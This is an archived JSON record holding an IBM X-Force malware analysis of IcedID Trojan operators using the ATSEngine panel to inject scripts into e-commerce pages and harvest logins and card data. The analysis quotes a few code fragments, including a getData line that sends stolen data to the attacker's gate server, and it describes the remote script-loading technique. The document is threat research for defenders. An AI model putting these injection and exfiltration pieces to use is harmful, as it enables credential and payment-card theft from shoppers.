{
    "id": "f201a3c5-de0d-49d5-b4b0-702dd805854b",
    "created_at": "2023-01-12T14:59:40.144948Z",
    "updated_at": "2025-03-27T02:06:04.174907Z",
    "deleted_at": null,
    "sha1_hash": "cb37c66183b5ca25a91000f3727c8ec05ae25616",
    "title": "2019-02-06 - IcedID Operators Using ATSEngine Injection Panel to Hit E-Commerce Sites",
    "authors": "",
    "file_creation_date": "2022-05-27T22:36:52Z",
    "file_modification_date": "2022-05-27T22:36:52Z",
    "file_size": 4028167,
    "plain_text": "# IcedID Operators Using ATSEngine Injection Panel to Hit E-Commerce Sites\n\n**[securityintelligence.com/icedid-operators-using-atsengine-injection-panel-to-hit-e-commerce-sites/](https://securityintelligence.com/icedid-operators-using-atsengine-injection-panel-to-hit-e-commerce-sites/)**\n\nFebruary 6, 2019\n\n[Home&nbsp/](https://securityintelligence.com/) [Advanced Threats](https://securityintelligence.com/category/x-force/threats/)\nIcedID Operators Using ATSEngine Injection Panel to Hit E-Commerce Sites\n\n[Advanced Threats February 6 2019](https://securityintelligence.com/category/x-force/threats/)\n\n\n-----\n\nBy [Itzik Chimino co-authored by Limor Kessem,](https://securityintelligence.com/author/itzik-chimino/) [Ophir Harpaz 8 min read](https://securityintelligence.com/author/ophir-harpaz/)\nAs part of the ongoing research into cybercrime tools targeting users of financial services\nand e-commerce, IBM X-Force analyzes the tactics, techniques and procedures (TTPs) of\norganized malware gangs, exposing their inner workings to help diffuse reliable threat\nintelligence to the security community.\n\nIn recent analysis of [IcedID Trojan attacks, our team looked into how IcedID operators target](https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/)\ne-commerce vendors in the U.S., the gang’s typical attack turf. The threat tactic is a two-step\ninjection attack designed to steal access credentials and payment card data from victims.\nGiven that the attack is separately operated, it’s plausible that those behind IcedID are either\nworking on different monetization schemes or renting botnet sections to other criminals,\n[turning it to a cybercrime-as-a-service operation, similar to the Gozi Trojan’s business model.](https://securityintelligence.com/q1-2018-results-gozi-ursnif-takes-larger-piece-of-the-pie-and-distributes-icedid/)\n\n## IcedID Origins\n\nIBM Security [discovered and named IcedID in September 2017. This modern banking Trojan](https://thecyberwire.com/podcasts/cw-podcasts-rs-2018-02-10.html)\nfeatures similar modules to malware like TrickBot and Gozi. It typically targets banks,\npayment card providers, mobile services providers, payroll, webmail and e-commerce sites,\nand its attack turf is mainly the U.S. and Canada. In their configuration files, it is evident that\nIcedID’s operators target business accounts in search of heftier bounties than those typically\nfound in consumer accounts.\n\nIcedID has the ability to launch different attack types, including webinjection, redirection and\nproxy redirection of all victim traffic through a port it listens on.\n\nThe malware’s distribution and infection tactics suggest that its operators are not new to the\ncybercrime arena; it has infected users via the Emotet Trojan since 2017 and in test\ncampaigns launched in mid-2018, also via TrickBot. Emotet has been among the most\nnotable malicious services catering to elite cybercrime groups from Eastern Europe over the\n[past two years. Among its dubious customers are groups that operate QakBot,](https://malwarebreakdown.com/2017/05/06/malspam-leads-to-malicous-word-document-which-downloads-geodoemotet-banking-malware/) [Dridex,](https://nakedsecurity.sophos.com/2017/08/10/watch-out-for-emotet-the-trojan-thats-nearly-a-worm/)\n[IcedID and TrickBot.](https://securityintelligence.com/trickbots-cryptocurrency-hunger-tricking-the-bitcoin-out-of-wallets/)\n\n## Using ATSEngine to Orchestrate Attacks on E-Commerce Users\n\nWhile current IcedID configurations feature both webinjection and malware-facilitate\nredirection attacks, let’s focus on its two-stage webinjection scheme. This tactic differs from\nsimilar Trojans, most of which deploy the entire injection either from the configuration or on\nthe fly.\n\nTo deploy injections and collect stolen data coming from victim input, some IcedID operators\n[use a commercial inject panel known as Yummba’s ATSEngine. ATS stands for automatic](http://www.xylibox.com/2014/05/atsengine.html)\ntransaction system in this case. A web-based control panel, ATSEngine works from an\nattack/injection server, not from the malware’s command-and-control (C&C) server. It allows\nthe attacker to orchestrate the injection process, update injections on the attack server with\n\n\n-----\n\nagility and speed, parse stolen data, and manage the operation of fraudulent transactions.\n[Commercial transaction panels are very common and have been in widespread use since](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Boutin.pdf)\nthey became popular in the days of the Zeus Trojan circa 2007.\n\n## Targeting Specific E-Commerce Vendors\n\nIn the attack we examined, we realized that some IcedID operators are using the malware to\ntarget very specific brands in the e-commerce sphere. Our researchers noted that this attack\nis likely sectioned off from the main botnet and operated by criminals who specialize in\nfraudulent merchandise purchases and not necessarily bank fraud.\n\nLet’s look at a sample code from those injections. This particular example was taken from an\nattack designed to steal credentials and take over the accounts of users browsing to a\npopular e-commerce site in the U.S.\n\nAs a first step, to receive any information from the attack server, the resident malware on the\ninfected device must authenticate itself to the botnet’s operator. It does so using a script from\nthe configuration file. If the bot is authenticated to the server, a malicious script is sent from\nthe attacker’s ATSEngine server, in this case via the URL home_link/gate.php.\n\nNotice that IcedID protects its configured instructions with encryption. The bot therefore\nrequires a private key that authenticates versus the attacker’s web-based control panel (e.g.,\n_var pkey = “Ab1cd23”). This means the infected device would not interact with other C&C_\nservers that may belong to other criminals or security researchers.\n\n_Figure 1: IcedID Trojan receives instructions on connecting to attack server (source: IBM_\n_Trusteer)_\n\nNext, we evaluated the eval(function(p, a, c, k, e, r) function in the communication with the\nattack server and got the following code to reveal. Encoding is a common strategy to pack\ncode and make it more compact.\n\n\n-----\n\n_Figure 2: IcedID code designed to set the browser to accept external script injections_\n_(source: IBM Trusteer)_\n\nThis function sets the infected user’s browser to accept external script injections that the\nTrojan will fetch from its operator’s server during an active attack.\n\nThe following snippet shows the creation of a document object model (DOM) script element\nwith type Text/javascript and the ID jsess_script_loader. The injection’s developer used this\ntechnique to inject a remote script into a legitimate webpage. It fetches the remote script\nfrom the attacker’s C&C and then embeds it in a script tag, either in the head of the original\nwebpage or in its body.\n\n\n-----\n\nTaking a closer look at the function used here, we can see that it loads the script from the\n_home_link of the ssid= of the infected user’s device, along with the current calendar date._\n\n_Figure 3: IcedID code designed to inject remote script into targeted website (source: IBM_\n_Trusteer)_\n\n## Steps 1 and 2: JavaScript and HTML\n\nTo perform the webinjection, an external script, a malicious JavaScript snippet, is charged\nwith injecting HTML code into the infected user’s browser. Using this tactic, the malware\ndoes not deploy the entire injection from the configuration file, which would essentially\nexpose it to researchers who successfully decrypt the configuration. Rather, it uses an initial\ninjection as a trigger to fetch a second part of the injection from its attack server in real time.\nThat way, the attack can remain more covert and the attacker can have more agility in\nupdating injections without having to update the configuration file on all the infected devices.\n\nIn the example below, the HTML code, named ccgrab, modifies the page the victim is\nviewing and presents social engineering content to steal payment card data. This extra\ncontent on the page prompts the victim to provide additional information about his or her\nidentity to log in securely.\n\n\n-----\n\n_Figure 4: IcedID tricking victim with webinjection (source: IBM Trusteer)_\n\nThe malware automatically grabs the victim’s access credentials and the webinjection\nrequests the following additional data elements pertaining to the victim’s payment card:\n\nCredit card number;\nCVV2; and\nThe victim’s state of residence.\n\nOnce the victim enters these details, the data is sent to the attacker’s ATSEngine server in\nparsed form that allows the criminal to view and search data via the control panel.\n\n_Figure 5: Parsed stolen data sent to attacker’s injection server (source: IBM Trusteer)_\n\n\n-----\n\n## Managing Data Theft and Storage\n\nThe malicious script run by the malware performs additional functions to grab content from\nthe victim’s device and his or her activity. The content grabbing function also checks the\nvalidity of the user’s input to ensure that the C&C does not accumulate junk data over time\nand manages the attack’s variables.\n\n_Figure 6: Malicious IcedID script manages data grabbing (source: IBM Trusteer)_\n\nOnce the data from the user is validated, it is saved to the C&C:\n\n_Figure 7: Saving stolen data to attack server logs (source: IBM Trusteer)_\n\n## Injection Attack Server Functions\n\nThe attack server enables the attacker to command infected bots by a number of functions.\nLet’s look at the function list that we examined once we decoded IcedID’s malicious script:\n\n**Function name** **Purpose**\n\n**isFrame()** Checks for frames on the website to look for potential third-party\nsecurity controls.\n\n\n-----\n\n**isValidCardNumber(a)** Validates that payment card numbers are correct. This function\nis likely based on the Luhn algorithm.\n\n**onLoaded()** The main function that sets off the data grabbing process.\n\n**addLog(a,b,c,d)** Adds new logs to the reports section in the attack server.\n\n**writeLog()** Writes logs to the attack server after validation of the private key\nand the victim’s service set identifier (SSID). This is achieved by\nthe following script: getData(gate_link + a + “&pkey=” +\n_urlEncode(pkey) + “&ssid=” + b, b)_\n\nThe attack server enables the operator to use different functions that are sectioned into tabs\non the control panel:\n\nAccounts page functions — shows the account pages the victim is visiting with the\ninfected user’s credentials.\nContent variables — includes report generation, account page controls, pushing HTML\ncontent into pages the victim is viewing, and a comments module to keep track of\nactivity.\nPrivate functions to get HEX and decode.\nMain page functions.\nComments global.\nReports global.\n\nFigure 8 below shows the layout of information about functions used on a given infected\ndevice as it appears to the attacker using the ATSEngine control panel:\n\n\n-----\n\n_Figure 8: Attacker’s view from the control panel that manages stolen data (source: IBM_\n_Trusteer)_\n\n## Data Management and Views\n\nThe ATSEngine control panel enables the attacker to view the active functions with a time\nstamp (see Figure 8). The following information is retrieved from the victim’s device and sent\nto the attack server:\n\nLast report time from this infected device;\nVictim’s IP Address;\nVictim’s attributed BotID;\nVictim’s login credentials to the website he or she is visiting;\nAdditional grabbed data from webinjection to the target page, including the victim’s\nname, payment card type, card number and CVV2, and state of residence; and\nComments section inserted by the attacker about the particular victim and his or her\naccounts.\n\nA view from the control panel displays essential data in tables, providing the attacker with the\nvictim’s login credentials to the targeted site:\n\n\n-----\n\n_Figure 9: Stolen account information parsed on control panel view (source: IBM Trusteer)_\n\n## Sectioned IcedID Botnet\n\nFollowing the analysis of IcedID’s injections and control panel features, our researchers\nbelieve that, much like other Trojan-operating gangs, IcedID is possibly renting out its\ninfrastructure to other criminals who specialize in various fraud scenarios.\n\nThe control panel, a common element in online fraud operations, reveals the use of a\ntransaction automation tool (ATS) by IcedID’s operators. This commercial panel helps\nfacilitate bot control, data management and management of fraudulent activity. The panel of\nchoice here is a longtime staple in the cybercrime arena called the Yummba/ATSEngine.\n\nFraud scenarios may vary from one operator to another, but IcedID’s TTPs remain the same\nand are applied to all the attacks the Trojan facilitates. As such, IcedID’s webinjections can\napply to any website, and its redirection schemes can be fitted to any target.\n\n## Sharpened Focus in 2019\n\nWhile some Trojan gangs choose to expand their attack turf into more countries, this requires\nfunding, resources to build adapted attack tools, alliances with local organized crime and\nadditional money laundering operations. In IcedID’s case, it does not appear the gang is\nlooking to expand. Ever since it first appeared in the wild, IcedID has kept its focus on North\nAmerica by targeting banks and e-commerce businesses in that region.\n\nIn 2018, IcedID reached the fourth rank on the global financial Trojan chart, having kept up\nits malicious activity throughout the year\n\n\n-----\n\n_Figure 10: Top 10 financial Trojan gangs in 2018 (source: IBM Trusteer)_\n\nIn 2019, our team expects to see this trend continue. To keep up on threats like IcedID, read\nmore [threat research from the X-Force team and join](https://securityintelligence.com/category/x-force/) [X-Force Exchange, where we publish](https://exchange.xforce.ibmcloud.com/#/)\nindicators of compromise (IoCs) and other valuable intelligence for security professionals.\n\nHear more at the NRF Protect session – Nirvana: Cut Your e-Fraud and Customer Friction\nSimultaneously\n\n[Itzik Chimino](https://securityintelligence.com/author/itzik-chimino/)\nSecurity Web Researcher in Security Intelligence\n\nItzik Chimino is a Security Web Researcher in Security Intelligence, and is experienced in\nmalware analysis. Prior to this role, Itzik worked at \"F5 Networks...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-06 - IcedID Operators Using ATSEngine Injection Panel to Hit E-Commerce Sites.pdf"
    ],
    "report_names": [
        "2019-02-06 - IcedID Operators Using ATSEngine Injection Panel to Hit E-Commerce Sites.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535580,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 1653691012,
    "ts_modification_date": 1653691012,
    "files": {
        "pdf": "https://archive.orkl.eu/cb37c66183b5ca25a91000f3727c8ec05ae25616.pdf",
        "text": "https://archive.orkl.eu/cb37c66183b5ca25a91000f3727c8ec05ae25616.txt",
        "img": "https://archive.orkl.eu/cb37c66183b5ca25a91000f3727c8ec05ae25616.jpg"
    }
}